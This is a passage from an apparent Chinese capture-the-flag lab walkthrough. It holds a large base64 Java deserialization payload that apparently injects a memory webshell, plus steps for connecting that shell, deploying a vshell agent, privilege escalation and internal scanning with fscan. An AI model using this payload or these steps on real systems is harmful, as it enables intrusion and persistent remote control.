RWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3dFQUZFeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNOEtqNDdBUUFXYzNWdUxtMXBjMk11UWtGVFJUWTBSR1ZqYjJSbGNnZ0EwQUVBQjJadmNrNWhiV1VNQU5JQVN3b0FYd0RUQVFBTVpHVmpiMlJsUW5WbVptVnlDQURWQVFBSloyVjBUV1YwYUc5a0RBRFhBS2tLQUY4QTJBRUFFR3BoZG1FdWRYUnBiQzVDWVhObE5qUUlBTm9CQUFwblpYUkVaV052WkdWeUNBRGNBUUFHWkdWamIyUmxDQURlQVFBT1kyOXRjSEpsYzNObFpFUmhkR0VCQUFOdmRYUUJBQjlNYW1GMllTOXBieTlDZVhSbFFYSnlZWGxQZFhSd2RYUlRkSEpsWVcwN0FRQUNhVzRCQUI1TWFtRjJZUzlwYnk5Q2VYUmxRWEp5WVhsSmJuQjFkRk4wY21WaGJUc0JBQVoxYm1kNmFYQUJBQjlNYW1GMllTOTFkR2xzTDNwcGNDOUhXa2xRU1c1d2RYUlRkSEpsWVcwN0FRQUdZblZtWm1WeUFRQUJiZ0VBQVVrQkFCMXFZWFpoTDJsdkwwSjVkR1ZCY25KaGVVOTFkSEIxZEZOMGNtVmhiUWNBNmdFQUhHcGhkbUV2YVc4dlFubDBaVUZ5Y21GNVNXNXdkWFJUZEhKbFlXMEhBT3dCQUIxcVlYWmhMM1YwYVd3dmVtbHdMMGRhU1ZCSmJuQjFkRk4wY21WaGJRY0E3Z29BNndBaEFRQUZLRnRDS1ZZTUFCa0E4UW9BN1FEeUFRQVlLRXhxWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0T3lsV0RBQVpBUFFLQU84QTlRRUFCSEpsWVdRQkFBVW9XMElwU1F3QTl3RDRDZ0R2QVBrQkFBVjNjbWwwWlFFQUJ5aGJRa2xKS1ZZTUFQc0EvQW9BNndEOUFRQUxkRzlDZVhSbFFYSnlZWGtCQUFRb0tWdENEQUQvQVFBS0FPc0JBUUVBQlhObGRFWldBUUE1S0V4cVlYWmhMMnhoYm1jdlQySnFaV04wTzB4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzB4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsV0FRQUVkbUZ5TUFFQUJIWmhjakVCQUFOMllXd0JBQVJuWlhSR0FRQS9LRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDNKbFpteGxZM1F2Um1sbGJHUTdEQUVJQVFrS0FBSUJDZ0VBRjJwaGRtRXZiR0Z1Wnk5eVpXWnNaV04wTDBacFpXeGtCd0VNQVFBRGMyVjBEQUVPQUNzS0FRMEJEd0VBQTI5aWFnRUFDV1pwWld4a1RtRnRaUUVBQldacFpXeGtBUUFaVEdwaGRtRXZiR0Z1Wnk5eVpXWnNaV04wTDBacFpXeGtPd29CRFFDd0FRQURaMlYwQVFBbUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME95bE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc01BUllCRndvQkRRRVlBUUFlYW1GMllTOXNZVzVuTDA1dlUzVmphRVpwWld4a1JYaGpaWEIwYVc5dUJ3RWFBUUFnVEdwaGRtRXZiR0Z1Wnk5T2IxTjFZMmhHYVdWc1pFVjRZMlZ3ZEdsdmJqc0JBQkJuWlhSRVpXTnNZWEpsWkVacFpXeGtBUUF0S0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlJtbGxiR1E3REFFZEFSNEtBRjhCSHdFQURXZGxkRk4xY0dWeVkyeGhjM01NQVNFQWZBb0FYd0VpQ2dFYkFCc0JBQXgwWVhKblpYUlBZbXBsWTNRQkFBcHRaWFJvYjJST1lXMWxBUUFCYVFFQUIyMWxkR2h2WkhNQkFCdGJUR3BoZG1FdmJHRnVaeTl5Wldac1pXTjBMMDFsZEdodlpEc0JBQ0ZNYW1GMllTOXNZVzVuTDA1dlUzVmphRTFsZEdodlpFVjRZMlZ3ZEdsdmJqc0JBQ0pNYW1GMllTOXNZVzVuTDBsc2JHVm5ZV3hCWTJObGMzTkZlR05sY0hScGIyNDdBUUFLY0dGeVlXMURiR0Y2ZWdFQUVsdE1hbUYyWVM5c1lXNW5MME5zWVhOek93RUFCWEJoY21GdEFRQVRXMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQm0xbGRHaHZaQUVBQ1hSbGJYQkRiR0Z6Y3djQktRRUFFbWRsZEVSbFkyeGhjbVZrVFdWMGFHOWtjd0VBSFNncFcweHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOU5aWFJvYjJRN0RBRXpBVFFLQUY4Qk5RRUFCMmRsZEU1aGJXVU1BVGNBQmdvQXJRRTRBUUFHWlhGMVlXeHpEQUU2QU1jS0FCWUJPd0VBRVdkbGRGQmhjbUZ0WlhSbGNsUjVjR1Z6QVFBVUtDbGJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c01BVDBCUGdvQXJRRS9DZ0NJQUJzQkFCcHFZWFpoTDJ4aGJtY3ZVblZ1ZEdsdFpVVjRZMlZ3ZEdsdmJnY0JRZ0VBQ21kbGRFMWxjM05oWjJVTUFVUUFCZ29BaWdGRkNnRkRBQnNBSVFBQ0FBUUFBQUFBQUE0QUFRQUZBQVlBQVFBSEFBQUFMUUFCQUFFQUFBQURFZzJ3QUFBQUFnQUlBQUFBQmdBQkFBQUFFQUFKQUFBQURBQUJBQUFBQXdBS0FBc0FBQUFCQUE0QUJnQUJBQWNBQUFBUUFBRUFBUUFBQUFRVEFCQ3dBQUFBQUFBQkFCRUFCZ0FDQUJJQUFBQUVBQUVBRkFBSEFBQUFGd0FEQUFFQUFBQUx1d0FXV1JNQUdMY0FITEFBQUFBQUFBRUFHUUFkQUFJQUJ3QUFBR01BQXdBREFBQUFGU3EzQUNJcXRnQW1UQ3EzQUNsTktpc3N0Z0F0c1FBQUFBSUFDQUFBQUJZQUJRQUFBQjBBQkFBZUFBa0FId0FPQUNBQUZBQWlBQWtBQUFBZ0FBTUFBQUFWQUFvQUN3QUFBQWtBREFBZUFCOEFBUUFPQUFjQUlBQWZBQUlBRWdBQUFBUUFBUUF2QUFFQUl3QWtBQUlBQndBQUFYd0FCd0FIQUFBQWtMZ0FRN1lBUjB3QlRTc1NTYllBVFJKUHVBQlRUaTBTVmJnQVV6b0VHUVFTVjdnQVV6b0ZHUVVTV2JnQVV6b0dLeEpidGdCTkVsMEV2UUJmV1FNckVtRzJBRTFUQkwwQVBGa0RHUVpUdUFCa1RhY0FCRTRzeHdBNEt4Sm10Z0JOdGdCcEVtcTRBRzNBQUc5T0xiWUFjN2tBZUFFQU9nUXJFbnEyQUUwWkJMWUFmcllBZ3BrQUJoa0VUYWNBQkU0c3NBQUNBQWtBVVFCVUFDOEFXUUNLQUkwQUx3QURBQWdBQUFCR0FCRUFBQUFsQUFjQUpnQUpBQ2dBRlFBcEFCMEFLZ0FtQUNzQUx3QXNBRkVBTGdCVUFDMEFWUUF3QUZrQU1nQnJBRE1BZGdBMEFJY0FOUUNLQURnQWpRQTNBSTRBT2dBSkFBQUFYQUFKQUJVQVBBQXdBQjhBQXdBZEFEUUFNUUFmQUFRQUpnQXJBRElBSHdBRkFDOEFJZ0F6QUI4QUJnQnJBQjhBTkFBMUFBTUFkZ0FVQURZQUh3QUVBQUFBa0FBS0FBc0FBQUFIQUlrQU53QTRBQUVBQ1FDSEFCNEFId0FDQUQwQUFBQWNBQVgvQUZRQUF3Y0FBZ2NBT2djQVBBQUJCd0F2QURSQ0J3QXZBQUFTQUFBQUNnQUVBSVFBaGdDSUFJb0FBZ0FuQUNRQUFnQUhBQUFCVkFBR0FBY0FBQUI2dUFCRHRnQkhUQUZOS3lxMkFKYTJBRTIyQUdsTnB3QmpUaXEyQUppNEFKeTRBS0E2QkJJNkVxRUd2UUJmV1FNU29sTlpCTElBcDFOWkJiSUFwMU8yQUtzNkJSa0ZCTFlBc1JrRkt3YTlBRHhaQXhrRVUxa0VBN2dBdFZOWkJSa0V2cmdBdFZPMkFMbkFBRjg2QmhrR3RnQnBUYWNBQlRvRUxMQUFBZ0FKQUJVQUdBQXZBQmtBY3dCMkFJd0FBd0FJQUFBQU5nQU5BQUFBUGdBSEFEOEFDUUJCQUJVQVN3QVlBRUlBR1FCRUFDVUFSUUJEQUVZQVNRQkhBRzBBU0FCekFFb0FkZ0JKQUhnQVRBQUpBQUFBU0FBSEFDVUFUZ0NOQUk0QUJBQkRBREFBandDUUFBVUFiUUFHQUpFQWtnQUdBQmtBWHdDVEFKUUFBd0FBQUhvQUNnQUxBQUFBQndCekFEY0FPQUFCQUFrQWNRQWdBQjhBQWdBOUFBQUFMZ0FEL3dBWUFBTUhBQUlIQURvSEFEd0FBUWNBTC84QVhRQUVCd0FDQndBNkJ3QThCd0F2QUFFSEFJejZBQUVBRWdBQUFBUUFBUUF2QUFFQUtnQXJBQUVBQndBQUFMMEFCd0FGQUFBQU1Dc1N3QVM5QUY5WkF4SVdVd1M5QUR4WkF4TENVN2dBWkU0dEVzTzRBRzNBQU1VNkJCa0VMTFlBeVZlbkFBUk9zUUFCQUFBQUt3QXVBQzhBQkFBSUFBQUFHZ0FHQUFBQVVRQVpBRklBSkFCVEFDc0FWUUF1QUZRQUx3QldBQWtBQUFBMEFBVUFHUUFTQUxvQUh3QURBQ1FBQndDN0FMd0FCQUFBQURBQUNnQUxBQUFBQUFBd0FCNEFId0FCQUFBQU1BQWdBQjhBQWdDOUFBQUFEQUFCQUNRQUJ3QzdBTDRBQkFBOUFBQUFCd0FDYmdjQUx3QUFDQUNaQUpvQUFnQUhBQUFCQUFBR0FBUUFBQUJxRXRHNEFOUk1LeExXQkwwQVgxa0RFaFpUdGdEWks3WUFhUVM5QUR4WkF5cFR0Z0M1d0FDaXdBQ2lzRTBTMjdnQTFFd3JFdDBEdlFCZnRnRFpBUU85QUR5MkFMbE9MYllBZmhMZkJMMEFYMWtERWhaVHRnRFpMUVM5QUR4WkF5cFR0Z0M1d0FDaXdBQ2lzQUFCQUFBQUtnQXJBQzhBQkFBSUFBQUFHZ0FHQUFBQVhBQUdBRjBBS3dCZUFDd0FYd0F5QUdBQVJRQmhBQWtBQUFBMEFBVUFCZ0FsQU1vQWtnQUJBRVVBSlFETEFCOEFBd0FzQUQ0QXpBQ1VBQUlBQUFCcUFNMEF6Z0FBQURJQU9BREtBSklBQVFDOUFBQUFGZ0FDQUFZQUpRREtBTThBQVFBeUFEZ0F5Z0RQQUFFQVBRQUFBQVlBQVdzSEFDOEFFZ0FBQUFvQUJBQ0VBSWdBaGdDS0FBa0FuUUNlQUFJQUJ3QUFBTlFBQkFBR0FBQUFQcnNBNjFtM0FQQk11d0R0V1NxM0FQTk51d0R2V1N5M0FQWk9FUUVBdkFnNkJDMFpCTFlBK2xrMkJac0FEeXNaQkFNVkJiWUEvcWYvNnl1MkFRS3dBQUFBQXdBSUFBQUFIZ0FIQUFBQVpnQUlBR2NBRVFCb0FCb0FhUUFoQUdzQUxRQnNBRGtBYmdBSkFBQUFQZ0FHQUFBQVBnRGdBSTRBQUFBSUFEWUE0UURpQUFFQUVRQXRBT01BNUFBQ0FCb0FKQURsQU9ZQUF3QWhBQjBBNXdDT0FBUUFLZ0FVQU9nQTZRQUZBRDBBQUFBY0FBTC9BQ0VBQlFjQW9nY0E2d2NBN1FjQTd3Y0FvZ0FBL0FBWEFRQVNBQUFBQkFBQkFCUUFJQUVEQVFRQUFnQUhBQUFBVndBREFBUUFBQUFMS3l5NEFRc3JMYllCRUxFQUFBQUNBQWdBQUFBS0FBSUFBQUJ5QUFvQWN3QUpBQUFBS2dBRUFBQUFDd0FLQUFzQUFBQUFBQXNCQlFBZkFBRUFBQUFMQVFZQXpnQUNBQUFBQ3dFSEFCOEFBd0FTQUFBQUJBQUJBQzhBQ0FCckFGRUFBZ0FIQUFBQVZ3QUNBQU1BQUFBUktpdTRBUXROTEFTMkFSVXNLcllCR2JBQUFBQUNBQWdBQUFBT0FBTUFBQUIyQUFZQWR3QUxBSGdBQ1FBQUFDQUFBd0FBQUJFQkVRQWZBQUFBQUFBUkFSSUF6Z0FCQUFZQUN3RVRBUlFBQWdBU0FBQUFCQUFCQUM4QUNBRUlBUWtBQWdBSEFBQUF4d0FEQUFRQUFBQW9LcllBZmswc3hnQVpMQ3UyQVNCT0xRUzJBUlV0c0U0c3RnRWpUYWYvNmJzQkcxa3J0d0VrdndBQkFBa0FGUUFXQVJzQUJBQUlBQUFBSmdBSkFBQUFmQUFGQUgwQUNRQi9BQThBZ0FBVUFJRUFGZ0NDQUJjQWd3QWNBSVFBSHdDR0FBa0FBQUEwQUFVQUR3QUhBUk1CRkFBREFCY0FCUUNUQVJ3QUF3QUFBQ2dCRVFBZkFBQUFBQUFvQVJJQXpnQUJBQVVBSXdDUkFKSUFBZ0M5QUFBQURBQUJBQVVBSXdDUkFNOEFBZ0E5QUFBQURRQUQvQUFGQndCZlVBY0JHd2dBRWdBQUFBUUFBUUViQUNnQVVBQlJBQUlBQndBQUFFSUFCQUFDQUFBQURpb3JBNzBBWHdPOUFEeTRBR1N3QUFBQUFnQUlBQUFBQmdBQkFBQUFpd0FKQUFBQUZnQUNBQUFBRGdFbEFCOEFBQUFBQUE0QkpnRE9BQUVBRWdBQUFBZ0FBd0NJQUlvQWhnQXBBRkFBWWdBQ0FBY0FBQUlYQUFNQUNRQUFBTW9xd1FCZm1RQUtLc0FBWDZjQUJ5cTJBSDQ2QkFFNkJSa0VPZ1laQmNjQVpCa0d4Z0JmTE1jQVF4a0d0Z0UyT2djRE5nZ1ZDQmtIdnFJQUxoa0hGUWd5dGdFNUs3WUJQSmtBR1JrSEZRZ3l0Z0ZBdnBvQURSa0hGUWd5T2dXbkFBbUVDQUduLzlDbkFBd1pCaXNzdGdDck9nV24vNms2QnhrR3RnRWpPZ2FuLzUwWkJjY0FETHNBaUZrcnR3RkJ2eGtGQkxZQXNTckJBRitaQUJvWkJRRXR0Z0M1c0RvSHV3RkRXUmtIdGdGR3R3Rkh2eGtGS2kyMkFMbXdPZ2U3QVVOWkdRZTJBVWEzQVVlL0FBTUFKUUJ5QUhVQWlBQ2NBS01BcEFDS0FMTUF1Z0M3QUlvQUF3QUlBQUFBYmdBYkFBQUFqd0FVQUpBQUZ3Q1NBQnNBa3dBbEFKVUFLUUNYQURBQW1BQTdBSmtBVmdDYUFGMEFtd0JnQUpnQVpnQ2VBR2tBbndCeUFLTUFkUUNoQUhjQW9nQitBS01BZ1FDbEFJWUFwZ0NQQUtnQWxRQ3BBSndBcXdDa0FLd0FwZ0N0QUxNQXNRQzdBTElBdlFDekFBa0FBQUI2QUF3QU13QXpBU2NBNlFBSUFEQUFOZ0VvQVNrQUJ3QjNBQWNBa3dFcUFBY0FwZ0FOQUpNQkt3QUhBTDBBRFFDVEFTc0FCd0FBQU1vQkVRQWZBQUFBQUFES0FTWUF6Z0FCQUFBQXlnRXNBUzBBQWdBQUFNb0JMZ0V2QUFNQUZBQzJBSkVBa2dBRUFCY0Fzd0V3QUpBQUJRQWJBSzhCTVFDU0FBWUFQUUFBQUM4QURnNURCd0JmL2dBSUJ3QmZCd0N0QndCZi9RQVhCd0V5QVN6NUFBVUNDRUlIQUlnTERWUUhBSW9PUndjQWlnQVNBQUFBQ0FBREFJZ0FoZ0NLQUFBPQcAWAwAWQBaDABbAFwHAF0BABBqYXZhL2xhbmcvT2JqZWN0BwBeDABfAGAMAGEAYgwAYwBkDABhAGUBAAh0TlBHR2ttYwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEADElubmVyQ2xhc3NlcwEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAXZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcnMBACIoKVtMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABRnZXRTeXN0ZW1DbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAtuZXdJbnN0YW5jZQEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAAVABYKABQAZgAhABMAFAAAAAAAAwABABUAFgACABcAAADLAAYABQAAAFkqtwBnEgK4AANMKxIEBL0ABVkDEgZTtgAHTSwEtgAIuAAJEgq2AAtOK7YADAMyOgQZBAS2AA0sGQQEvQAOWQO4AA9TtgAQBL0ADlkDLVO2ABHAAAW2ABJXsQAAAAIAGAAAACYACQAAABAABAARAAoAEgAaABMAHwAUACgAFQAwABYANgAXAFgAGAAZAAAANAAFAAAAWQAaABsAAAAKAE8AHAAdAAEAGgA/AB4AHwACACgAMQAgACEAAwAwACkAIgAjAAQAJAAAAAQAAQAlAAEAJgAnAAIAFwAAAD8AAAADAAAAAbEAAAACABgAAAAGAAEAAAAcABkAAAAgAAMAAAABABoAGwAAAAAAAQAoACkAAQAAAAEAKgArAAIAJAAAAAQAAQAsAAEAJgAtAAIAFwAAAEkAAAAEAAAAAbEAAAACABgAAAAGAAEAAAAhABkAAAAqAAQAAAABABoAGwAAAAAAAQAoACkAAQAAAAEALgAvAAIAAAABADAAMQADACQAAAAEAAEALAACADIAAAACADMAVgAAAAoAAQA+ADsAVQAJdXEAfgAYAAAA8sr+ur4AAAAxABMBAANGb28HAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACEZvby5qYXZhAQAUamF2YS9pby9TZXJpYWxpemFibGUHAAcBABBzZXJpYWxWZXJzaW9uVUlEAQABSgVx5mnuPG1HGAEADUNvbnN0YW50VmFsdWUBAAY8aW5pdD4BAAMoKVYMAA4ADwoABAAQAQAEQ29kZQAhAAIABAABAAgAAQAaAAkACgABAA0AAAACAAsAAQABAA4ADwABABIAAAARAAEAAQAAAAUqtwARsQAAAAAAAQAFAAAAAgAGcHQAAsGQcHcBAHhzcgAiwarBocG2waHArsGswaHBrsGnwK7BicGuwbTBpcGnwaXBshLioKT3gYc4AgABSQAKwbbBocGswbXBpXhyACDBqsGhwbbBocCuwazBocGuwafArsGOwbXBrcGiwaXBsoaslR0LlOCLAgAAeHAAAAABeA==</span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">138.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.99</span>.<span class="number">157.159</span>:<span class="number">8080</span>/</span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/11.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/12.png"></p>
<p>这里注意，<strong>自定义的请求头要加上去</strong></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/13.png"></p>
<p>连接成功</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/14.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/15.png"></p>
<p>我们直接上线vshell</p>
<p>不出网，只能正向上线</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/16.png"></p>
<p>生成，上传到靶机中</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/17.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/18.png"></p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/19.png"></p>
<p>上线成功</p>
<p>能传东西，自然也可以用新出的cve-2025-32463打</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/20.png"></p>
<p>挂代理，fscan开扫</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webserver:/tmp<span class="comment"># ./fscan -h 172.16.53.0/24 -eh 172.16.53.30</span></span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2025-07-08 17:58:24] [INFO] 暴力破解线程数: 1</span></span><br></pre></td></tr></table></figure>

<p>没扫出来什么东西</p>
<p>这是官方给出来的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Extranet <span class="number">172.16</span>.<span class="number">53.30</span></span><br><span class="line">ASLITPC03 <span class="number">172.16</span>.<span class="number">36.21</span></span><br><span class="line">ASLSRVFS02 <span class="number">172.16</span>.<span class="number">34.23</span></span><br><span class="line">ASLSRVAD05 <span class="number">172.16</span>.<span class="number">34.5</span></span><br></pre></td></tr></table></figure>

<p>ping一下试试</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@webserver:/tmp<span class="comment"># ping 172.16.34.23</span></span><br><span class="line">PING <span class="number">172.16</span>.<span class="number">34.23</span> (<span class="number">172.16</span>.<span class="number">34.23</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of <span class="keyword">data</span>.</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.739</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.379</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">3</span> ttl=<span class="number">128</span> time=<span class="number">0.301</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">4</span> ttl=<span class="number">128</span> time=<span class="number">0.338</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">5</span> ttl=<span class="number">128</span> time=<span class="number">0.299</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">6</span> ttl=<span class="number">128</span> time=<span class="number">0.418</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">7</span> ttl=<span class="number">128</span> time=<span class="number">0.290</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">8</span> ttl=<span class="number">128</span> time=<span class="number">0.296</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.23</span>: icmp_seq=<span class="number">9</span> ttl=<span class="number">128</span> time=<span class="number">0.405</span> ms</span><br><span class="line"></span><br><span class="line">root@webserver:/tmp<span class="comment"># ping 172.16.36.21</span></span><br><span class="line">PING <span class="number">172.16</span>.<span class="number">36.21</span> (<span class="number">172.16</span>.<span class="number">36.21</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of <span class="keyword">data</span>.</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">36.21</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.585</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">36.21</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.326</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">36.21</span>: icmp_seq=<span class="number">3</span> ttl=<span class="number">128</span> time=<span class="number">0.316</span> ms</span><br><span class="line">^C</span><br><span class="line"><span class="literal">---</span> <span class="number">172.16</span>.<span class="number">36.21</span> ping statistics <span class="literal">---</span></span><br><span class="line"><span class="number">3</span> packets transmitted, <span class="number">3</span> received, <span class="number">0</span>% packet loss, time <span class="number">2069</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">0.316</span>/<span class="number">0.409</span>/<span class="number">0.585</span>/<span class="number">0.124</span> ms</span><br><span class="line">root@webserver:/tmp<span class="comment"># ping 172.16.34.5</span></span><br><span class="line">PING <span class="number">172.16</span>.<span class="number">34.5</span> (<span class="number">172.16</span>.<span class="number">34.5</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of <span class="keyword">data</span>.</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">128</span> time=<span class="number">0.353</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">128</span> time=<span class="number">0.278</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">3</span> ttl=<span class="number">128</span> time=<span class="number">0.294</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">4</span> ttl=<span class="number">128</span> time=<span class="number">0.286</span> ms</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">172.16</span>.<span class="number">34.5</span>: icmp_seq=<span class="number">5</span> ttl=<span class="number">128</span> time=<span class="number">0.274</span> ms</span><br><span class="line">^C</span><br><span class="line"><span class="literal">---</span> <span class="number">172.16</span>.<span class="number">34.5</span> ping statistics <span class="literal">---</span></span><br></pre></td></tr></table></figure>

<p>都能通，那么就一个个打吧</p>
